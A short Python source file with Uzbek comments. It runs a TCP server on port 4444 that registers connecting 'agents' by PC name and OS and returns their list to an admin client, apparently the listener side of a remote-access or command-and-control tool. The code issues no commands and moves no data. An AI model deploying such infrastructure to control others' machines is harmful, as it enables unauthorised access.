import socket
import threading

HOST = '0.0.0.0'
PORT = 4444  # Render uchun port

agents = {}  # Faol agentlar: {agent_id: {"socket": conn, "addr": addr, "info": info}}

def handle_agent(conn, addr):
    try:
        data = conn.recv(1024).decode('utf-8', errors='ignore')
        if data.startswith("AGENT|"):
            _, pc_name, os_info = data.split("|", 2)
            agent_id = f"{pc_name}_{addr[0]}"
            agents[agent_id] = {"socket": conn, "addr": addr[0], "info": os_info}
            print(f"[+] Agent ulandi: {pc_name} ({addr[0]})")
            
            # Aloqani ushlab turish
            while True:
                msg = conn.recv(1024)
                if not msg:
                    break
    except:
            pass
    finally:
        # Uzilganda o'chirish
        for aid, val in list(agents.items()):
            if val["socket"] == conn:
                del agents[aid]
                print(f"[-] Agent uzildi: {aid}")
                break
        conn.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Server {PORT}-portda ishga tushdi...")
    
    while True:
        conn, addr = server.accept()
        # Admin yoki Agent ekanligini tekshiramiz
        try:
            conn.settimeout(2.0)
            check_type = conn.recv(1024).decode('utf-8', errors='ignore')
            conn.settimeout(None)
            
            if check_type.startswith("ADMIN_LIST"):
                # Admin barcha agentlar ro'yxatini so'rayapti
                response = ""
                for aid, val in agents.items():
                    response += f"{aid.split('_')[0]}|{val['addr']}|{val['info']}___"
                if not response:
                    response = "EMPTY"
                conn.sendall(response.encode('utf-8'))
                conn.close()
            else:
                # Agar oddiy agent bo'lsa
                threading.Thread(target=handle_agent, args=(conn, addr), daemon=True).start()
        except:
            conn.close()

if __name__ == "__main__":
    start_server()